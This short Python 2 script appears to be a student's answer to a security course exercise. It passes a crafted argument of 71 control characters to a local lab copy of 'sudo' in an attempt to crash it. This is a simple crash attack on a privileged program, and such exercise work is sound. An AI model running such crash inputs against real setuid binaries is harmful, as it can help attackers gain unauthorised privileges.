import os, sys


PATH_TO_SUDO = './sudo'


def crash_sudo():
    # Your code here
    pw = ""
    for i in range(1,72):
    	pw += chr(i)

    os.execl(PATH_TO_SUDO, "" ,pw , "a")

    raise NotImplementedError()


def main(argv):
    if not len(argv) == 1:
        print 'Usage: %s' % argv[0]
        sys.exit(1)

    crash_sudo()


if __name__ == '__main__':
    main(sys.argv)
